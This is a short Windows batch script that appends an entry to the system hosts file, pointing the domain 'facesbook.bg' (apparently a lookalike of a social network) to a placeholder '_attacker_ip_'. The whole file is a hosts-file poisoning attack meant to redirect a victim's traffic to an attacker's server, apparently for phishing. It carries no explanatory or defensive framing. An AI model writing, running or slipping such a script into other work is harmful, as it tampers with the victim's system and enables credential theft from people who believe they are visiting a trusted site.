@echo off

set hostspath=%windir%\System32\drivers\etc\hosts

echo _attacker_ip_           facesbook.bg >> %hostspath%
exit
